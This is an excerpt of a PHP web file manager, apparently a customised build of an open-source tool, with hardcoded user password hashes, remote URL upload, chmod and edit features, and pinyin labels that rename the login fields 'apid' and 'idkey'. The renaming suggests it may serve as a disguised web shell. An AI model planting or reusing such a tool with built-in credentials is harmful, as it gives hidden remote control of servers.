...
$use_auth = true;
$auth_users = array(
    '1.2.3' => '$2y$10$A.JVc8az5n8qn6M5ZHNg7OS6w1aBmv8lnb9rF4kHnpN2s6A.mnpai', 
    'fuzhu' => '$2y$10$9lk2b1mTUDRa7qoFUoJcqueLuunCHUYn7j2HJkmZRYVI2hOyMSAlC' 
);
        ...
        <div class="card mb-2 fm-upload-wrapper">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    ...
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> 网络文件</a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
        ...
        <table class="table table-bordered table-hover table-sm bg-white" id="main-table">
            ...
            foreach ($folders as $f) {
                ...
                <tr>
                    ...
                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td><?php if (!FM_READONLY): ?><a title="修改Quanxian" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
                        </td>
            ...
            foreach ($files as $f) {
                ...
                <tr>
                    ...
                    <td>
                        <div class="filename"><a href="<?php echo $filelink ?>" title="文件信息"><i class="<?php echo $img ?>"></i> <?php echo fm_convert_win($f) ?>
                            </a><?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?></div>
                    </td>
                    ...
                    <td><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td><?php if (!FM_READONLY): ?><a title="<?php echo '修改Quanxian' ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
                        </td>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'WenJianGuanLi';      $tr['en']['AppTitle']           = 'WenJianGuanLi';
    $tr['en']['Login']          = 'DengLun';                $tr['en']['Username']           = 'apid';
    $tr['en']['Password']       = 'idkey';               $tr['en']['Logout']             = 'TuiChu';
    $tr['en']['Move']           = 'YiDong';                   $tr['en']['Copy']               = 'FuZhi';
    $tr['en']['Save']           = 'BaoCun';                   $tr['en']['SelectAll']          = 'QuanXuan';
    $tr['en']['UnSelectAll']    = 'QuxiaoQuanxuan';           $tr['en']['File']               = 'WenJian';
    $tr['en']['Back']           = 'QuxiaoShangchuan';                   $tr['en']['Size']               = 'WendangDaxiao';
    $tr['en']['Perms']          = 'Quanxian';                  $tr['en']['Modified']           = 'XiugaiShijian';
    $tr['en']['Owner']          = 'YongYouZhe';                  $tr['en']['Search']             = 'Chazhao';
    $tr['en']['NewItem']        = 'Chuangjian';               $tr['en']['Folder']             = 'WenJianjia';
    $tr['en']['Delete']         = 'Shanchu';                 $tr['en']['Rename']             = 'Gaiming';
    $tr['en']['CopyTo']         = 'Fuzhi';                $tr['en']['DirectLink']         = 'ZhiLian';
    $tr['en']['UploadingFiles'] = 'Shangchuan';           $tr['en']['ChangePermissions']  = 'XiuGaiQuanxian';
    $tr['en']['Copying']        = 'FuZhi...';                $tr['en']['CreateNewItem']      = 'ChuangjianWenjian';
    $tr['en']['Name']           = 'WenjianMing';                   $tr['en']['AdvancedEditor']     = 'BianJiQi';
    $tr['en']['RememberMe']     = 'JiZhu';            $tr['en']['Actions']            = 'Kezhixing';
    $tr['en']['Upload']         = 'Shangchuan';                 $tr['en']['Cancel']             = 'QuXiao';
    $tr['en']['InvertSelection']= 'FanXuan';       $tr['en']['DestinationFolder']  = 'MuBiaoWenJianjia';
    $tr['en']['ItemType']       = 'LeiXing';              $tr['en']['ItemName']           = 'MingCheng';
    $tr['en']['CreateNow']      = 'Chuangjian';             $tr['en']['Download']           = 'XiaZai';
    $tr['en']['Open']           = 'KaiQi';                   $tr['en']['UnZip']              = 'JieYa';
    $tr['en']['UnZipToFolder']  = 'JieYaDaoWenJianjia';        $tr['en']['Edit']               = 'BianJi';
    $tr['en']['NormalEditor']   = 'BianJiQi';          $tr['en']['BackUp']             = 'BeiFen';
    $tr['en']['SourceFolder']   = 'YuanWenJianjia';          $tr['en']['Files']              = 'WenJian';
    $tr['en']['Move']           = 'YiDong';                   $tr['en']['Change']             = 'XiuGai';
    $tr['en']['Settings']       = 'PeiZhi';               $tr['en']['Language']           = 'YuYan';
    $tr['en']['MemoryUsed']     = 'NeiCun';            $tr['en']['PartitionSize']      = 'FenquDaxiao';
    $tr['en']['ErrorReporting'] = 'ShangchuanCuowu';        $tr['en']['ShowHiddenFiles']    = 'XianshiYincang';
    $tr['en']['Full size'] 		= 'Tongji';				$tr['en']['Help'] 				= 'BangZhu';
    $tr['en']['Free of'] 		= 'KeYongDaXiao';				$tr['en']['Preview'] 			= 'ChaKan';
	$tr['en']['Help Documents'] = 'BangZhuWenJian';			$tr['en']['Report Issue']		= 'BaoGaoWenTi';
    $tr['en']['Generate'] 		= 'Shengcheng';				$tr['en']['FullSize']           = 'ShiJiDaXiao';
    $tr['en']['FreeOf']         = 'KeYongDaXiao';                $tr['en']['CalculateFolderSize']= 'JisuanWenJianjiaDaxiao';
    $tr['en']['Check Latest Version']= 'JianChaGengxin';
    $tr['en']['Generate new password hash'] = 'Chongzhiidkey';
    $tr['en']['HideColumns'] = 'YincangQuanxian/SuoYouZhelie';
